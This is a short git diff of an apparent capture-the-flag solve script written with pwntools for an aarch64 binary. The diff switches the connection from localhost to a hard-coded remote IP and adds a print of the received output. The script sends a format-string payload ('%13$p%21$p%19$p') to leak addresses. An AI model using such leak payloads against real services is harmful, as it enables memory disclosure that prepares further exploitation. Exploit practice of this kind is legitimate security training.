@@ -12,7 +12,10 @@ ld = ELF('ld-linux-aarch64.so.1')
 
 #p = process('qemu-aarch64 chalarm'.split())
 
-p = remote('localhost', 5000)
+#p = remote('localhost', 5000)
+
+# This was solved on my rii aws machine... i think solve scripts differ on my mac
+p = remote('18.219.102.246', 5000)
 
 
 p.sendlineafter(b'2. Legs\n', b'1')
@@ -21,7 +24,7 @@ p.sendlineafter(b'of?\n', b'1337')
 p.sendlineafter(b'appendage? ', b'%13$p%21$p%19$p')
 # the below was for chal with pie
 #p.sendlineafter(b'appendage? ', b'%23$p%21$p%19$p')
-#print(p.recv())
+print(p.recv())
 leaks = p.recv().split(b'0x')
 print(leaks)
 # main is at the 23rd offset
